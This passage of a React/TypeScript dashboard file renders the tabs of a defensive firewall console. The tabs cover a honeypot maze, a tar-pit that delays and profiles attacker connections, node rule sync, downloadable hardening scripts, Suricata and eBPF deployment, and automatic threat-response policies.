                  <Bdg label={path.pathNode} color={TYPE_COLOR[path.nodeType]??"#888"} sm/>
                  <span style={{ fontFamily:"monospace", fontSize:9, color:"#ccc" }}>{path.attackerIp}</span>
                </div>
                <span style={{ fontSize:8, color:"#444" }}>{msToHuman(path.delayMs)} delay</span>
              </div>
              {path.breadcrumb&&<div style={{ fontSize:8, color:"#444", fontFamily:"monospace", marginTop:2 }}>Payload: {path.breadcrumb.substring(0,60)}</div>}
            </div>
          ))}
          {!loading&&(labyrinth?.recentPaths??[]).length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No maze traversals yet — trigger a loop from the Endless Loop Engine™ tab</div>}
        </div>
      </FwmCard>

      {/* Attacker session paths */}
      <FwmCard>
        <SectionTitle icon={<Waves size={12} color="#cc44ff"/>} title={`Attacker Session Paths (${labSessions?.length??0} sessions)`}/>
        <div style={{ maxHeight:400, overflow:"auto" }}>
          {(labSessions??[]).slice(0,20).map(sess=>(
            <div key={sess.sessionId} style={{ background:"#111", borderRadius:6, padding:"8px 10px", marginBottom:6 }}>
              <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{sess.attackerIp}</span>
                <div style={{ display:"flex", gap:4 }}>
                  <Bdg label={`${sess.nodeCount} nodes`} color="#cc44ff" sm/>
                  <Bdg label={`${msToHuman(sess.totalDelay)} wasted`} color="#ff6600" sm/>
                </div>
              </div>
              <div style={{ display:"flex", flexWrap:"wrap", gap:2 }}>
                {sess.nodesVisited.slice(0,10).map((node,i)=>(
                  <span key={i} style={{ display:"flex", alignItems:"center", gap:2 }}>
                    <Bdg label={node.substring(0,12)} color={TYPE_COLOR[node]??"#333"} sm/>
                    {i < Math.min(9, sess.nodesVisited.length-1) && <span style={{color:"#333",fontSize:8}}>→</span>}
                  </span>
                ))}
                {sess.nodesVisited.length > 10 && <span style={{fontSize:8,color:"#444"}}>+{sess.nodesVisited.length-10} more</span>}
              </div>
            </div>
          ))}
          {!loading&&(labSessions??[]).length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No sessions tracked yet</div>}
        </div>
      </FwmCard>
    </div>
  );
}

// ── Tar Pit Drain Engine™ Tab ──────────────────────────────────────────────────
function TarPitTab() {
  const { data: tarpit, loading, reload } = useFwm<TarpitStatus>("/honeypot/tarpit-status");
  const [drainIp, setDrainIp] = useState("");
  const [draining, setDraining] = useState(false);

  const addToDrain = async () => {
    if (!drainIp.trim()) return;
    setDraining(true);
    await fwmPost("/honeypot/tarpit-drain", { ip:drainIp });
    setDrainIp(""); setDraining(false); await reload();
  };

  const escalate = async (connectionId: string) => {
    await fwmPost(`/honeypot/tarpit-escalate/${connectionId}`, {});
    await reload();
  };

  const msToHuman = (ms: number) => {
    if (ms < 1000) return `${ms}ms`;
    if (ms < 60000) return `${(ms/1000).toFixed(1)}s`;
    if (ms < 3600000) return `${Math.floor(ms/60000)}m`;
    return `${Math.floor(ms/3600000)}h ${Math.floor((ms%3600000)/60000)}m`;
  };

  const totalHours = Math.floor((tarpit?.stats.totalWastedMs??0) / 3600000);
  const totalMins  = Math.floor(((tarpit?.stats.totalWastedMs??0) % 3600000) / 60000);

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* Tar Pit Overview */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Hourglass size={14} color="#ff4444"/>} title="Tar Pit Drain Engine™ — Exponential Delay Escalation" badge="Layer 3" badgeColor="#ff4444"
          extra={<Btn2 onClick={reload} color="#333" sm><RefreshCw size={10}/></Btn2>}
        />
        <InfoBar text="Every attacker connection entering Layer 3 faces escalating delays: 1.5s → 5s → 15s → 45s → 120s per request. At maximum drain, attackers waste 2 minutes per HTTP request — keeping them occupied while Ghost intel collects ISP, geo, hop chain, DNS, and fingerprint data." color="#ff4444"/>
        {/* Delay escalation visualization */}
        <div style={{ display:"flex", gap:8, marginBottom:12, alignItems:"flex-end" }}>
          {(tarpit?.stages??[]).map((stage, i) => {
            const height = 20 + (i * 15);
            const count = (tarpit?.connections??[]).filter(c=>c.drainStage===stage.name).length;
            return (
              <div key={stage.name} style={{ flex:1, display:"flex", flexDirection:"column", alignItems:"center", gap:4 }}>
                <div style={{ fontSize:8, color:stage.color, fontWeight:700 }}>{count > 0 ? count : "0"}</div>
                <div style={{ width:"100%", height:`${height}px`, background:`${stage.color}33`, border:`1px solid ${stage.color}66`, borderRadius:4, display:"flex", alignItems:"center", justifyContent:"center" }}>
                  <span style={{ fontSize:7, color:stage.color, fontWeight:700 }}>{msToHuman(stage.delayMs)}</span>
                </div>
                <div style={{ fontSize:7, color:"#555", textAlign:"center" }}>{stage.label}</div>
              </div>
            );
          })}
          <div style={{ borderLeft:"1px solid #1a1a1a", marginLeft:4, paddingLeft:8, display:"flex", flexDirection:"column", gap:4, justifyContent:"center" }}>
            <div style={{ fontSize:8, color:"#ff4444", fontWeight:700, fontFamily:"monospace" }}>→ ∞</div>
            <div style={{ fontSize:7, color:"#444" }}>Auto-loops</div>
            <div style={{ fontSize:7, color:"#444" }}>back to L1</div>
          </div>
        </div>
        {/* Stats */}
        <div style={{ display:"grid", gridTemplateColumns:"repeat(5,1fr)", gap:8 }}>
          {[
            {l:"Active Drains",    v:tarpit?.stats.activeConnections??0,    c:"#ff4444"},
            {l:"Total Connections",v:tarpit?.stats.totalConnections??0,     c:"#fff"},
            {l:"Wasted Total",     v:`${totalHours}h ${totalMins}m`,        c:"#ff9900"},
            {l:"Dead Loop (2min)", v:tarpit?.stats.deadLoopCount??0,        c:"#ff2244"},
            {l:"Auto-Blocked",     v:tarpit?.stats.autoBlocked??0,          c:"#ff6600"},
          ].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"8px 4px" }}>
              <div style={{ fontSize:16, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:8, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>

      {/* Manual drain */}
      <FwmCard>
        <SectionTitle icon={<Timer size={12} color="#ff4444"/>} title="Manual Tar Pit — Drain Any IP"/>
        <InfoBar text="Add any attacker IP to the drain queue. They'll experience escalating delays on every request — 1.5s → 5s → 15s → 45s → 2 minutes. Ghost system collects full intel automatically." color="#ff4444"/>
        <div style={{ display:"flex", gap:6, marginBottom:10 }}>
          <input value={drainIp} onChange={e=>setDrainIp(e.target.value)} placeholder="Attacker IP to drain..." style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <Btn2 onClick={addToDrain} color="#ff4444" disabled={draining||!drainIp.trim()}>{draining?"⟳":"⏳ Drain"}</Btn2>
        </div>
        {/* How it works */}
        <div style={{ background:"#0a0505", border:"1px solid #ff444433", borderRadius:8, padding:12 }}>
          <div style={{ fontSize:9, color:"#ff4444", fontWeight:700, marginBottom:8, fontFamily:"monospace" }}>HOW THE DRAIN LOOP WORKS</div>
          {[
            { step:1, label:"Ghost Trap (L1) captures attacker",    detail:"IP, UA, headers, hop chain, geo, ISP, ASN, DNS extracted" },
            { step:2, label:"Labyrinth (L2) opens fake maze",        detail:"10 fake endpoints served in sequence — each logs attacker queries" },
            { step:3, label:"Tar Pit (L3) begins exponential drain", detail:"1.5s → 5s → 15s → 45s → 120s delay per request" },
            { step:4, label:"Session expires (fake)",                detail:"'Your session timed out' → attacker tries again from step 1" },
            { step:5, label:"Loop resets, delay escalates",          detail:"Each new loop cycle adds +500ms base delay — endless" },
          ].map(s=>(
            <div key={s.step} style={{ display:"flex", gap:8, alignItems:"flex-start", marginBottom:6 }}>
              <div style={{ width:18, height:18, borderRadius:"50%", background:"#ff444422", border:"1px solid #ff444444", display:"flex", alignItems:"center", justifyContent:"center", fontSize:8, color:"#ff4444", flexShrink:0, fontWeight:700 }}>{s.step}</div>
              <div>
                <div style={{ fontSize:9, color:"#ccc", fontWeight:700 }}>{s.label}</div>
                <div style={{ fontSize:8, color:"#555" }}>{s.detail}</div>
              </div>
            </div>
          ))}
        </div>
      </FwmCard>

      {/* Drain Queue */}
      <FwmCard>
        <SectionTitle icon={<Hourglass size={12} color="#ff4444"/>} title={`Drain Queue (${tarpit?.connections?.filter(c=>c.isActive).length??0} active)`}/>
        <div style={{ maxHeight:430, overflow:"auto" }}>
          {(tarpit?.connections??[]).slice(0,40).map(conn=>(
            <div key={conn.id} style={{ background:"#111", borderRadius:6, padding:"8px 10px", marginBottom:5, borderLeft:`3px solid ${DRAIN_COLORS[conn.drainStage]??"#333"}`, opacity:conn.isActive?1:0.5 }}>
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:3 }}>
                <div style={{ display:"flex", gap:5, alignItems:"center" }}>
                  <Bdg label={conn.drainStage.replace("_"," ").toUpperCase()} color={DRAIN_COLORS[conn.drainStage]??"#888"} sm/>
                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{conn.attackerIp}</span>
                </div>
                <div style={{ display:"flex", gap:4 }}>
                  {conn.isActive && <Btn2 onClick={()=>escalate(conn.connectionId)} color="#ff6600" sm>Escalate</Btn2>}
                  {conn.autoBlocked && <Bdg label="BLOCKED" color="#ff2244" sm/>}
                </div>
              </div>
              {/* Delay progress bar */}
              <div style={{ marginBottom:4 }}>
                <div style={{ display:"flex", justifyContent:"space-between", fontSize:8, color:"#555", marginBottom:2 }}>
                  <span>Current delay: <span style={{color:DRAIN_COLORS[conn.drainStage]}}>{msToHuman(conn.currentDelayMs)}</span></span>
                  <span>Wasted: <span style={{color:"#ff6600"}}>{msToHuman(conn.totalWastedMs)}</span></span>
                </div>
                <div style={{ background:"#0a0a0a", borderRadius:3, height:5, overflow:"hidden" }}>
                  <div style={{ width:`${conn.drainPercent}%`, height:"100%", background:DRAIN_COLORS[conn.drainStage], borderRadius:3, transition:"width 0.5s" }}/>
                </div>
              </div>
              <div style={{ fontSize:8, color:"#444" }}>
                Hits: {conn.hitCount} · Max: {msToHuman(conn.maxDelayMs)}
                {conn.ghostIntelJson && <span style={{color:"#4488ff"}}> · {(conn.ghostIntelJson as any).country ?? ""} {(conn.ghostIntelJson as any).isp ?? ""}</span>}
              </div>
            </div>
          ))}
          {!loading && (tarpit?.connections??[]).length === 0 && (
            <div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No connections in drain queue — attackers will appear here automatically when they hit lure endpoints</div>
          )}
        </div>
      </FwmCard>

      {/* Ghost Intel per connection */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<ShieldCheck size={12} color="#00ff88"/>} title="Ghost System Integration — All Collected Attacker Intel"/>
        <InfoBar text="Every attacker hitting the three-layer system is enriched with Ghost system data: IP geolocation, ISP/ASN, DNS reverse lookup, VPN/Tor detection, hop chain tracing, browser fingerprint, screen size, timezone. All data flows into the SilkWeb and SIEM automatically." color="#00ff88"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8 }}>
          {[
            {label:"IP Geolocation",    detail:"Country, city, lat/lon via ip-api.com",                    icon:"🌍"},
            {label:"ISP/ASN Intel",     detail:"Carrier, hosting provider, autonomous system number",       icon:"🏢"},
            {label:"DNS Reverse Lookup",detail:"PTR record → reveals VPS/cloud/residential",               icon:"🔍"},
            {label:"VPN/Tor Detection", detail:"ASN org pattern matching — 30+ VPN providers detected",    icon:"🕵️"},
            {label:"Hop Chain Tracing", detail:"X-Forwarded-For headers decoded — up to 12 proxy hops",    icon:"🔗"},
            {label:"Browser Fingerprint",detail:"User-Agent, Accept-Language, screen size, timezone",      icon:"🖥️"},
            {label:"Payload Analysis",  detail:"SQLi, XSS, LFI, RCE, path traversal auto-classified",      icon:"💉"},
            {label:"SilkWeb + SIEM",    detail:"Auto-fed into SilkWeb topology map and SIEM event log",    icon:"🕸️"},
          ].map(item=>(
            <div key={item.label} style={{ background:"#111", borderRadius:6, padding:"10px 12px", borderLeft:"3px solid #00ff8833" }}>
              <div style={{ fontSize:14, marginBottom:4 }}>{item.icon}</div>
              <div style={{ fontSize:10, fontWeight:700, color:"#00ff88", marginBottom:2 }}>{item.label}</div>
              <div style={{ fontSize:8, color:"#555" }}>{item.detail}</div>
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ── Main ──────────────────────────────────────────────────────────────────
// ── Node Sync Status Tab ──────────────────────────────────────────────────────
function NodeInstallCommand({ node, cmd }: { node: { id: number; name: string; ipAddress: string }; cmd: string }) {
  const [copied, setCopied] = useState(false);
  const [expanded, setExpanded] = useState(false);
  return (
    <div style={{ marginBottom:8, background:"#0a0a0a", borderRadius:6, border:"1px solid #1a1a1a" }}>
      <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", padding:"8px 10px", cursor:"pointer" }} onClick={()=>setExpanded(!expanded)}>
        <div style={{ fontFamily:"monospace", fontSize:11, color:"#ccc" }}>
          {node.name} <span style={{ color:"#555", fontSize:9 }}>{node.ipAddress} · node {node.id}</span>
        </div>
        <div style={{ display:"flex", gap:6 }}>
          <button
            onClick={(e)=>{ e.stopPropagation(); navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(()=>setCopied(false),2000); }}
            style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:4, padding:"3px 10px", cursor:"pointer", fontSize:10, fontFamily:"monospace" }}
          >{copied?"✓ Copied":"Copy"}</button>
          <span style={{ color:"#555", fontSize:11 }}>{expanded?"▲":"▼"}</span>
        </div>
      </div>
      {expanded && <pre style={{ margin:0, padding:"10px 12px", fontSize:8, color:"#888", borderTop:"1px solid #1a1a1a", overflow:"auto", maxHeight:220, fontFamily:"monospace", whiteSpace:"pre-wrap", wordBreak:"break-all" }}>{cmd}</pre>}
    </div>
  );
}

function NodeSyncTab() {
  const [status, setStatus] = useState<{ currentRulesHash: string; ruleCount: number; blockedIpCount: number; ghostOsRuleCount: number; nodes: { id: number; name: string; ipAddress: string; fwSyncedAt: string | null; fwSyncHash: string | null; installCmd: string }[] } | null>(null);
  const [loading, setLoading] = useState(true);
  const [lastFetched, setLastFetched] = useState<Date | null>(null);

  const fetchStatus = useCallback(async () => {
    try {
      const res = await fetch("/api/firewall/sync-status");
      if (res.ok) { setStatus(await res.json()); setLastFetched(new Date()); }
    } catch { /* ignore */ } finally { setLoading(false); }
  }, []);

  useEffect(() => { fetchStatus(); const iv = setInterval(fetchStatus, 30_000); return () => clearInterval(iv); }, [fetchStatus]);

  if (loading) return <div style={{ color:"#555", fontFamily:"monospace", padding:20 }}>Loading sync status…</div>;
  if (!status) return <div style={{ color:"#ff4444", fontFamily:"monospace", padding:20 }}>Failed to load sync status</div>;

  const currentHash = status.currentRulesHash;
  const syncedCount = status.nodes.filter(n => n.fwSyncHash === currentHash).length;
  const allSynced = syncedCount === status.nodes.length && status.nodes.length > 0;

  return (
    <div>
      <FwmCard>
        <SectionTitle
          icon={<Server size={13}/>}
          title="Firewall Enforcement Plane — Node Sync"
          badge={allSynced?`✓ ALL ${status.nodes.length} IN SYNC`:`⚠ ${status.nodes.length - syncedCount} STALE`}
          badgeColor={allSynced?"#00ff88":"#ff4444"}
        />
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8, marginBottom:12 }}>
          {[
            { label:"Current Hash", value:currentHash, color:"#00ff88" },
            { label:"Active Rules", value:String(status.ruleCount), color:"#4488ff" },
            { label:"Blocked IPs", value:String(status.blockedIpCount), color:"#ff6600" },
            { label:"GhostOS Rules", value:String(status.ghostOsRuleCount), color:"#cc44ff" },
          ].map(s => (
            <div key={s.label} style={{ background:"#0a0a0a", borderRadius:6, padding:"8px 10px", border:"1px solid #1a1a1a" }}>
              <div style={{ fontSize:9, color:"#555", marginBottom:3 }}>{s.label}</div>
              <div style={{ fontFamily:"monospace", fontSize:11, color:s.color, fontWeight:700, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{s.value}</div>
            </div>
          ))}
        </div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:8, marginBottom:6 }}>
          {status.nodes.map(n => {
            const inSync = n.fwSyncHash === currentHash && !!n.fwSyncHash;
            const lastSync = n.fwSyncedAt ? new Date(n.fwSyncedAt) : null;
            const ageSec = lastSync ? Math.floor((Date.now() - lastSync.getTime()) / 1000) : null;
            const ageStr = ageSec === null ? "Never" : ageSec < 60 ? `${ageSec}s ago` : ageSec < 3600 ? `${Math.floor(ageSec/60)}m ago` : `${Math.floor(ageSec/3600)}h ago`;
            return (
              <div key={n.id} style={{ background:"#0d0d0d", border:`1px solid ${inSync?"#00ff8833":"#ff444433"}`, borderRadius:8, padding:"12px 14px" }}>
                <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:6 }}>
                  <div style={{ fontFamily:"monospace", fontWeight:700, color:"#fff", fontSize:12 }}>{n.name}</div>
                  <span style={{ background:inSync?"#00ff8822":"#ff444422", color:inSync?"#00ff88":"#ff4444", fontSize:9, padding:"2px 8px", borderRadius:4, fontWeight:700 }}>{inSync?"✓ IN SYNC":"⚠ STALE"}</span>
                </div>
                <div style={{ fontSize:9, color:"#555", marginBottom:3 }}>{n.ipAddress} · node {n.id}</div>
                <div style={{ fontSize:9, color:"#444", marginBottom:2 }}>Last sync: <span style={{ color:"#888" }}>{lastSync ? lastSync.toLocaleString() : "Never"}</span> <span style={{ color:"#555" }}>({ageStr})</span></div>
                <div style={{ fontSize:8, color:"#333", fontFamily:"monospace", overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>Applied: <span style={{ color:inSync?"#00ff8866":"#555" }}>{n.fwSyncHash ?? "none"}</span></div>
              </div>
            );
          })}
        </div>
        <div style={{ fontSize:9, color:"#333", textAlign:"right" }}>Auto-refreshes every 30s · Last fetched: {lastFetched?.toLocaleTimeString() ?? "—"}</div>
      </FwmCard>

      <FwmCard style={{ marginTop:12 }}>
        <SectionTitle
          icon={<Terminal size={13}/>}
          title="Node Install Commands"
          badge="Run once per node"
          badgeColor="#ff8800"
        />
        <div style={{ display:"flex", gap:8, marginBottom:12 }}>
          <Btn onClick={async()=>{
            try {
              const r = await fetch("/api/firewall/force-sync", { method:"POST" });
              if (r.ok) { await fetchStatus(); }
            } catch { /* ignore */ }
          }} color="#ff4444" sm>⚡ Force Re-sync All Nodes</Btn>
          <span style={{ fontSize:10, color:"#555", alignSelf:"center" }}>Clears all node hashes — they pick up the latest rules within 30s</span>
        </div>
        <p style={{ margin:"0 0 10px", fontSize:10, color:"#555" }}>
          Paste the command for the matching node in its noVNC console. The service starts automatically, polls every 30 seconds, and applies iptables changes within 30s of any rule change in the UI.
        </p>
        {status.nodes.map(n => <NodeInstallCommand key={n.id} node={n} cmd={n.installCmd}/>)}
      </FwmCard>

      <FwmCard style={{ marginTop:12 }}>
        <SectionTitle
          icon={<ShieldCheck size={13}/>}
          title="Full Node Security Hardening Script"
          badge="Run once per node"
          badgeColor="#00ff88"
        />
        <p style={{ margin:"0 0 4px", fontSize:10, color:"#555" }}>
          Downloads a comprehensive <strong style={{color:"#aaa"}}>self-contained bash script</strong> for each node. Safe to run — VPN client traffic is never blocked. Includes:
        </p>
        <div style={{ display:"flex", flexWrap:"wrap", gap:6, marginBottom:12 }}>
          {["sysctl kernel hardening","iptables DROP perimeter (WireGuard-aware)","IPv6 mirroring","fail2ban SSH + brute-force","SSH key-only / no root","DDoS monitor daemon","ATR watchdog (Suricata → auto-block)","Per-peer rules enforcer","Firewall rule sync (30s)","RAM-only WireGuard key init"].map(f => (
            <span key={f} style={{ background:"#00ff8811", border:"1px solid #00ff8822", color:"#00ff8899", fontSize:9, padding:"2px 7px", borderRadius:4 }}>{f}</span>
          ))}
        </div>
        <div style={{ padding:"8px 12px", background:"#0a0a0a", border:"1px solid #00ff8822", borderRadius:6, marginBottom:12, fontSize:10, color:"#555" }}>
          <strong style={{color:"#00ff8877"}}>WireGuard-aware design:</strong> <span style={{color:"#444"}}>The iptables <code style={{color:"#888"}}>FORWARD -i wg0 -j ACCEPT</code> and <code style={{color:"#888"}}>FORWARD -o wg0 -j ACCEPT</code> rules let all VPN client traffic through freely. The DROP policy only applies to the node&apos;s INPUT chain — blocking external attackers, not VPN users.</span>
        </div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:8 }}>
          {status.nodes.map(n => (
            <div key={n.id} style={{ background:"#0d0d0d", border:"1px solid #00ff8822", borderRadius:8, padding:"12px 14px" }}>
              <div style={{ fontFamily:"monospace", fontWeight:700, color:"#fff", fontSize:12, marginBottom:2 }}>{n.name}</div>
              <div style={{ fontSize:9, color:"#555", marginBottom:10 }}>{n.ipAddress} · node {n.id}</div>
              <a
                href={`/api/firewall/node-hardening-script?nodeId=${n.id}`}
                download={`proxhq-node-${n.id}-hardening.sh`}
                style={{ display:"inline-flex", alignItems:"center", gap:6, background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:5, padding:"6px 12px", fontSize:10, fontFamily:"monospace", textDecoration:"none", fontWeight:700 }}
              >
                <Download size={11}/> Download Hardening Script
              </a>
            </div>
          ))}
        </div>
        <div style={{ marginTop:10, padding:"8px 12px", background:"#0a0a0a", borderRadius:6, border:"1px solid #1a1a1a", fontSize:10, color:"#444", fontFamily:"monospace" }}>
          Run as root on each node: <span style={{ color:"#00ff88" }}>chmod +x proxhq-node-N-hardening.sh && ./proxhq-node-N-hardening.sh</span>
        </div>
      </FwmCard>

      <FwmCard style={{ marginTop:12 }}>
        <SectionTitle
          icon={<Shield size={13}/>}
          title="IPS Enforcement — Suricata Node Deployment"
          badge="Inline packet drop"
          badgeColor="#ff9900"
        />
        <p style={{ margin:"0 0 12px", fontSize:10, color:"#555" }}>
          Each node runs Suricata in NFQUEUE inline mode — all packets flow through Suricata before reaching the kernel network stack. IPS alerts automatically increment signature hit counters in real time. Rules sync every 60s from the API server.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:8 }}>
          {status.nodes.map(n => (
            <div key={n.id} style={{ background:"#0d0d0d", border:"1px solid #ff990033", borderRadius:8, padding:"12px 14px" }}>
              <div style={{ fontFamily:"monospace", fontWeight:700, color:"#fff", fontSize:12, marginBottom:4 }}>{n.name}</div>
              <div style={{ fontSize:9, color:"#555", marginBottom:8 }}>{n.ipAddress} · node {n.id}</div>
              <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
                <a href={`/api/firewall/ips/suricata-setup-script?nodeId=${n.id}`} download style={{ background:"#ff990022", border:"1px solid #ff990044", color:"#ff9900", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", textDecoration:"none" }}>
                  ⬇ Suricata Setup (node {n.id})
                </a>
                <a href={`/api/firewall/ips/suricata-setup-script`} download style={{ background:"#33333311", border:"1px solid #333", color:"#555", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", textDecoration:"none" }}>
                  Generic (no auto-sync)
                </a>
              </div>
            </div>
          ))}
        </div>
        <div style={{ marginTop:10, padding:"8px 12px", background:"#0a0a0a", borderRadius:6, border:"1px solid #1a1a1a", fontSize:10, color:"#444", fontFamily:"monospace" }}>
          After running: <span style={{ color:"#ff9900" }}>suricata --list-app-layer-protos</span> · IPS hits flow back to this page via <span style={{ color:"#44aaff" }}>POST /api/daemon-inbound/ips-event</span>
        </div>
      </FwmCard>

      <FwmCard style={{ marginTop:12 }}>
        <SectionTitle
          icon={<Cpu size={13}/>}
          title="eBPF/XDP Enforcement — Kernel-Bypass Deployment"
          badge="Pre-stack drop · line-rate"
          badgeColor="#4488ff"
        />
        <p style={{ margin:"0 0 12px", fontSize:10, color:"#555" }}>
          XDP programs attach at the NIC driver level — packets are dropped before they ever reach the kernel network stack. Faster than iptables. Requires clang + libbpf on each node. Rules auto-compile from the eBPF/XDP tab.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:8 }}>
          {status.nodes.map(n => (
            <div key={n.id} style={{ background:"#0d0d0d", border:"1px solid #4488ff33", borderRadius:8, padding:"12px 14px" }}>
              <div style={{ fontFamily:"monospace", fontWeight:700, color:"#fff", fontSize:12, marginBottom:4 }}>{n.name}</div>
              <div style={{ fontSize:9, color:"#555", marginBottom:8 }}>{n.ipAddress} · node {n.id}</div>
              <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
                <a href={`/api/firewall/ebpf/node-setup-script?nodeId=${n.id}&iface=eth0`} download style={{ background:"#4488ff22", border:"1px solid #4488ff44", color:"#4488ff", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", textDecoration:"none" }}>
                  ⬇ eBPF Deploy (eth0)
                </a>
                <a href={`/api/firewall/ebpf/node-setup-script?nodeId=${n.id}&iface=ens3`} download style={{ background:"#33333311", border:"1px solid #333", color:"#555", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", textDecoration:"none" }}>
                  ens3
                </a>
                <a href={`/api/firewall/ebpf/node-setup-script?nodeId=${n.id}&iface=wg0`} download style={{ background:"#33333311", border:"1px solid #333", color:"#555", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", textDecoration:"none" }}>
                  wg0
                </a>
              </div>
            </div>
          ))}
        </div>
        <div style={{ marginTop:10, padding:"8px 12px", background:"#0a0a0a", borderRadius:6, border:"1px solid #1a1a1a", fontSize:10, color:"#444", fontFamily:"monospace" }}>
          eBPF match events flow back via <span style={{ color:"#44aaff" }}>POST /api/daemon-inbound/ebpf-event</span> · Stats visible in eBPF/XDP tab
        </div>
      </FwmCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── Automatic Threat Response (ATR) ────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
type AtrPolicy = { id:number; name:string; scope:string; category:string|null; sid:string|null; triggerCount:number; windowSecs:number; action:string; cooldownMins:number; enabled:boolean; triggeredCount:number; createdAt:string };
type AtrEvent  = { id:number; policyId:number; policyName:string; sourceIp:string; nodeId:number; sid:string|null; triggerHits:number; action:string; triggeredAt:string };

const ATR_ACTION_COLOR: Record<string,string> = { block:"#ff4444", trap:"#cc44ff", block_and_trap:"#ff2288", notify:"#ffaa00" };

function AtrTab() {
  const [policies, setPolicies] = useState<AtrPolicy[]>([]);
  const [events, setEvents]     = useState<AtrEvent[]>([]);
  const [loading, setLoading]   = useState(true);
  const [form, setForm]         = useState({ name:"", scope:"category", category:"", sid:"", action:"block", cooldownMins:60 });
  const [saving, setSaving]     = useState(false);
  const [seeding, setSeeding]   = useState(false);

  const load = useCallback(async () => {
    setLoading(true);
    const [p, e] = await Promise.all([
      fetch("/api/firewall/atr/policies").then(r=>r.json()).catch(()=>({policies:[]})),
      fetch("/api/firewall/atr/events?limit=30").then(r=>r.json()).catch(()=>({events:[]})),
    ]);
    setPolicies(p.policies ?? []);
    setEvents(e.events ?? []);
    setLoading(false);
  }, []);
  useEffect(() => { load(); }, [load]);

  const createPolicy = async () => {
    if (!form.name) return;
    setSaving(true);
    await fetch("/api/firewall/atr/policies", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ ...form, triggerCount:1 }) });
    setSaving(false);
    setForm({ name:"", scope:"category", category:"", sid:"", action:"block", cooldownMins:60 });
    load();
  };
  const togglePolicy = async (p: AtrPolicy) => {
    await fetch(`/api/firewall/atr/policies/${p.id}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ enabled:!p.enabled }) });
    load();
  };
  const deletePolicy = async (id: number) => {
    await fetch(`/api/firewall/atr/policies/${id}`, { method:"DELETE" });
    load();
  };
  const seedDefaults = async () => {
    setSeeding(true);
    await fetch("/api/firewall/atr/seed", { method:"POST" });
    setSeeding(false);
    load();
  };

  const inp: React.CSSProperties = { background:"#111", border:"1px solid #333", color:"#eee", borderRadius:4, padding:"5px 8px", fontSize:12, fontFamily:"monospace", width:"100%" };
  const sel: React.CSSProperties = { ...inp, cursor:"pointer" };

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      <FwmCard>
        <SectionTitle title="⚡ Automatic Threat Response (ATR)"/>
        <p style={{ color:"#666", fontSize:12, marginBottom:12 }}>
          ATR automatically blocks, traps, or notifies when Suricata IPS events match a policy — no human intervention required.
          Detection-to-response latency: &lt; 1 second.
        </p>
        <div style={{ display:"flex", gap:8, marginBottom:12, flexWrap:"wrap" }}>
          <button onClick={seedDefaults} disabled={seeding} style={{ background:"#1a1a2a", border:"1px solid #4444aa", color:"#88aaff", borderRadius:4, padding:"6px 14px", fontSize:11, cursor:"pointer" }}>
            {seeding ? "Seeding…" : "Seed Default Policies (5)"}
          </button>
          <button onClick={load} style={{ background:"none", border:"1px solid #333", color:"#666", borderRadius:4, padding:"6px 12px", fontSize:11, cursor:"pointer" }}><RefreshCw size={11} /> Refresh</button>
        </div>
        {/* Create form */}
        <div style={{ display:"grid", gridTemplateColumns:"1fr 100px 100px 80px 80px auto", gap:6, marginBottom:14, alignItems:"end" }}>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Policy Name</div><input style={inp} value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} placeholder="e.g. Auto-block SQL injection" /></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Scope</div><select style={sel} value={form.scope} onChange={e=>setForm(f=>({...f,scope:e.target.value}))}>
            <option value="global">Global</option><option value="category">Category</option><option value="signature">Signature</option>
          </select></div>
